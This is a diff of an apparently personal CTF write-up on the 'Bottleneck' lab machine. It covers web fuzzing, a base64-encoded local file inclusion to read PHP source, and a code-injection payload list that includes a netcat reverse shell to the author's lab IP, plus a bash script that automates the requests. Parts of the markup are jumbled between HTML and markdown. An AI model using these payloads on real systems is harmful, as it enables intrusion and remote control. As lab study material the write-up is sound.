@@ -1027,173 +1027,105 @@ root@debian:/home/hadi#
     <p>Enumeration: run <code class="highlighter-rouge">rustscan</code> and found two ports 22,80, so run nmap against them, found that ssh is on version 7.9p1, the web contain the title BOTTLENECK, so going to enumerate it more with web fuzzing tool.</p>
   </li>
   <li>Web Fuzzing: run <code class="highlighter-rouge">webenum</code> and <code class="highlighter-rouge">feroxbuster</code> found nothing, but still we have no other service we must continue and enumerate the target with web fuzzing tool. run <code class="highlighter-rouge">ffuf</code> against the target with the dirb wordlist found the following:
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.170.22/FUZZ -e .php
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.166.22/FUZZ -e .php
 ...
 image_gallery.php       [Status: 200, Size: 6381, Words: 1626, Lines: 169, Duration: 371ms]
 </code></pre></div>    </div>
-    <p>going to that url over the browser and run F12 found that this page give us back parameters to include on the URL it self, the first one is t and the second is f:</p>
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.170.22/image_gallery.php?t=1709652216&amp;f=Ym90dGxlbmVja19kb250YmUucG5n
+    <p>Or we can also use wfuzz, since we know that there is index.php page which is the default landing page we can enumerate only for php pages.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w /usr/share/wordlists/dirb/big.txt -u  "http://192.168.166.22/FUZZ.php" --hc 404
+...
+000009353:   200        168 L    348 W      6381 Ch     "image_gallery"
+000009563:   200        272 L    729 W      10175 Ch    "index"  
+</code></pre></div>    </div>
+    <p>Then going to that URL over the browser and run F12 found that this page give us back parameters to include on the URL it self, the first one is t and the second is f:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.166.22/image_gallery.php?t=1709652216&amp;f=Ym90dGxlbmVja19kb250YmUucG5n
 </code></pre></div>    </div>
   </li>
   <li>Web Assessment: The f value look like short for file, so run <code class="highlighter-rouge">└─$ echo "Ym90dGxlbmVja19kb250YmUucG5n" | base64 -d</code> give us back the value <code class="highlighter-rouge">bottleneck_dontbe.png</code>, this may mean that this url can be use for local file inclusion (LFI), but for the t value it look like time, so search on google found that <code class="highlighter-rouge">date +%s</code> give us back the current time. So running burpsuite and the following query for trying get back the php code itself and understand what going on in that page.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains4 curl "http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n ''../../../../../../www/html/image_gallery.php'|base64)"
+</code></pre></div>    </div>
+    <p>The output for that one query is the following:
+<img src="/assets/images/op-001.png" alt="op-001.png" />.
+This is not the output we expected to see so play with the query a bit found the correct way to get the php file back.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains4 curl "http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n '../../../www/html/image_gallery.php'|base64)"
+</code></pre></div>    </div>
+    <p><img src="/assets/images/op-002.png" alt="op-002.png" />
+As you can see, we successfully include local file from the save in such way that we can see the original code.</p>
+  </li>
+  <li>Code Review: Since we can see that it use <code class="highlighter-rouge">image_gallery_load.php</code>, we can trying to get that file also and see the original php code that should be used for LFI misconfiguration:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains4 curl "http://192.168.166.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n '../../../www/html/image_gallery_load.php'|base64)"
+</code></pre></div>    </div>
+    <p>The output contains several lines of php code, so what we need to do is to review the original code and look at it’s structure, the block of code that looks interesting is the following:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if($isblocked){
+ $logfile = 'intrusion_'.$timestamp;
+ $fp = fopen('/var/log/soc/'.$logfile, 'w');
+ fwrite($fp, "'".$imagefile."'"); &lt;----------------------
+ fclose($fp);
+ exec('python /opt/ids_strong_bvb.py &lt;/var/log/soc/'.$logfile.' &gt;/tmp/output 2&gt;&amp;1');
+ print_troll();
+ exit();
+</code></pre></div>    </div>
+    <p>That block code contain the <code class="highlighter-rouge">$imagefile</code> that came from our query <code class="highlighter-rouge">$imagefile = base64_decode($_GET['f']);</code> at the beginning of the code, that image file contain the string of the image in base64, if the inserted value is decoded as <code class="highlighter-rouge">etc</code> or <code class="highlighter-rouge">dev</code> or <code class="highlighter-rouge">usr</code> or <code class="highlighter-rouge">home</code>, then it should block by another function that came above that section, then after it block the variable <code class="highlighter-rouge">$logfile</code> contain the timestamp, the variable <code class="highlighter-rouge">$fp</code> are used for open the <code class="highlighter-rouge">logfile</code> and write back to it the <code class="highlighter-rouge">$imagefile</code> value, then it run some python code named <code class="highlighter-rouge">ids_strong_bvb.py</code> which get the <code class="highlighter-rouge">$logfile</code> back and redirect the output to <code class="highlighter-rouge">/tmp/output</code> file. this is mean that we should be able to inject code by adding some value like <code class="highlighter-rouge">etc</code> to the <code class="highlighter-rouge">f=</code> value on the url (base64), then it should block that one since it is <code class="highlighter-rouge">etc</code> and pass the inject code to the <code class="highlighter-rouge">$logfile</code> which use later with that python code. If we succeeded the <code class="highlighter-rouge">/tmp/output</code> should contain the output from the injected command.
+In my case I have used the following bash code, that should execute each code in the payload.txt. My payload is:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../etc/passwd
+../etc/passwd' and __import__('os').system("uname -a") and '
+../../../../../tmp/output
+../../../../tmp/output
+../etc/passwd' and __import__('os').system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.159 443 &gt;/tmp/f") and '
+../../../../../tmp/output
+../../../../tmp/output
+../../../tmp/output
+../../tmp/output
+../tmp/output
+</code></pre></div>    </div>
+    <p>Please note that this payload is python based since the <code class="highlighter-rouge">ids_strong_bvb.py</code> should execute it. My original bash code is as follow
 ```
-proxychains4 curl “http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n “../../../../../../www/html/image_gallery.php”|base64)”
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.16
-[proxychains] Dynamic chain  …  127.0.0.1:8080  …  192.168.170.22:80  …  OK</li>
+#!/bin/bash
+url=$1
+wordlist=$2
+loop=0
+[ $# != 2 ] &amp;&amp; { echo “Usage: $0 url wordlist”; exit 1; }
+checksum=”d41d8cd98f00b204e9800998ecf8427e”</p>
+  </li>
 </ol>
 
-<p>Let me throw away your nice request into the bin.
-The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.
-Why don’t you wait on your chair until someone (maybe the police) knock on your door?</p>
+<p>while read file;
+do
+	loop=<code class="highlighter-rouge">expr $loop + 1</code>
+	echo “[+] Loop number: $loop”
+	echo “[+] Test file: $file”
+	echo “[+] GET reqest: $url?t=$(date +%s)&amp;f=$(echo -n “$file”| base64 -w 0)”
+	echo “[+] Script run: python /opt/ids_strong_bvb.py &lt;/var/log/soc/’.$file.’ &gt;/tmp/output 2&gt;&amp;1”;
+	echo “[+] Base64: $(echo -n $file| base64 -w 0)”
+	curl -s “$url?t=$(date +%s)&amp;f=$(echo -n “$file”| base64 -w 0)” -o “$loop.txt”;
+	echo “————-time: $(date +%s) ———”
+	echo “————read-file-$loop————”
+	cat ./”$loop.txt”</p>
 
-<pre>
-                                   _,..._
-                                  /__    \
-                                   &gt;&lt; `.  \
-                                  /_    \ |
-                                   \-_  /:|
-                                 ,--'..'. :
-                               ,'         `.
-                            _,'             \
-                   _.._,--''    ,           |
-               , ,',, _|    _,.'|      |    |
-            \||/,'(,' '--''    |      |    |
-       _     |||                |      /-'  |
-      | |   (- -)&lt;`._           |     /    /
-      | |  \_\O/_/`-.(&lt;&lt;        |____/    /
-      | |   /   \              / -'| `--.'|
-      | |   \___/             /           /
-      | |    H H             /     |     |
-      |_|_..-H-H--.._       /     ,|     |
-        |-.._"_"__..-|     |   _-/ |     |
-        |            |     |    |   \_   |
-        |            |     |    |   |    |
-        |            |     |____|   |    |
-        |            |  _..'    |   |____|
-        |            |_(____..._' _.'    |
-        `-..______..-'""         (___..--'
-<pre>
-```
-This is not the output we expected to see so play with the query a bit found the correct way to get the php file back.
-```
-proxychains4 curl "http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n "../../../www/html/image_gallery.php"|base64)"
-...
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filesum=$(cat "$loop.txt" | md5sum|awk '{print $1}')
+if [[ "$checksum" == "$filesum" ]];
+then
+	echo "[+] Found new file: $loop.txt"
+	echo "[+] URL: $url?t=$(date +%s)&amp;f=$(echo -n $file| base64)"
+	cat $loop.txt
+	break
+fi done &lt; $wordlist ``` You can see that my code do some checksum with the falue `d41d8cd98f00b204e9800998ecf8427e` which is the value of empty file. Then run it with the following command. ``` ./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt ``` Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.
+</code></pre></div></div>
 
-$tstamp = time();
-if(isset($_GET['t']) &amp;&amp; isset($_GET['f'])){
-    include_once 'image_gallery_load.php';
-    exit();
-}
+<ol>
+  <li>Initiation: so now after we have all set we can execute the code and on another terminal open listener for port 443.
+<img src="/assets/images/op-003.gif" alt="op-003.gif" /></li>
+</ol>
 
-?&gt;
-&lt;!DOCTYPE html&gt;
-```
+<h3 id="bottleneck-1">Bottleneck</h3>
 
-4. Code Review: Since we can see that it use `image_gallery_load.php`, we can trying to get that file also and see the php code that should be used for LFI misconfiguration:
-```
-proxychains4 curl "http://192.168.170.22/image_gallery.php?t=$(date +%s)&amp;f=$(echo -n "../../../www/html/image_gallery_load.php"|base64)"
-...
-<?php
-function print_troll(){
-    $messages = $GLOBALS['messages'];
-    $troll = $GLOBALS['troll'];
-    echo $messages[0];
-    echo $troll;
-}
+<h3 id="brokengallery">BrokenGallery</h3>
 
-$troll = <<<EOT
-<pre>
-                                   _,..._
-                                  /__    \
-                                   >< `.  \
-                                  /_    \ |
-                                   \-_  /:|
-...
-if(!isset($_GET['t']) || !isset($_GET['f'])){
-    exit();
-}
+<h3 id="dawn2">Dawn2</h3>
 
-$imagefile = base64_decode($_GET['f']);
-$timestamp = time();
-$isblocked = FALSE;
-$blacklist = array('/etc','/opt','/var','/opt','/proc','/dev','/lib','/bin','/usr','/home','/ids');
-$messages = array("\nLet me throw away your nice request into the bin.\n".
-    "The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n".
-    "Why don't you wait on your chair until someone (maybe the police) knock on your door?\n\n");
+<h3 id="dawn3">Dawn3</h3>
 
-if(abs($_GET['t'] - $timestamp) > 10){
-    exit();
-}
-foreach($blacklist as $elem){
-    if(strstr($imagefile, $elem) !== FALSE)
-        $isblocked = TRUE;
-}
-// report the intrusion to the soc and save information locally for further investigation
-if($isblocked){
-    $logfile = 'intrusion_'.$timestamp;
-    $fp = fopen('/var/log/soc/'.$logfile, 'w');
-    fwrite($fp, "'".$imagefile."'");
-    fclose($fp);
-    exec('python /opt/ids_strong_bvb.py </var/log/soc/'.$logfile.' >/tmp/output 2>&1');
-    print_troll();
-    exit();
-}
-chdir('img');
-$filecontent = file_get_contents($imagefile);
-if($filecontent === FALSE){
-    print_troll();
-}
-else{
-    echo $filecontent;
-}
-chdir('../');
-
-?>
-```
-The block of code that look interesting is the following:
-```
-if($isblocked){
-    $logfile = 'intrusion_'.$timestamp;
-    $fp = fopen('/var/log/soc/'.$logfile, 'w');
-    fwrite($fp, "'".$imagefile."'"); &lt;----------------------
-    fclose($fp);
-    exec('python /opt/ids_strong_bvb.py &lt;/var/log/soc/'.$logfile.' &gt;/tmp/output 2&gt;&amp;1');
-    print_troll();
-    exit();
-```
-That block code contain the `$imagefile` that came from our query `$imagefile = base64_decode($_GET['f']);`
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-### Bottleneck
-
-### BrokenGallery
-
-### Dawn2
-
-### Dawn3
-
-#### Final table methodology
-</pre></pre>
+<h4 id="final-table-methodology-1">Final table methodology</h4>
 
     
 
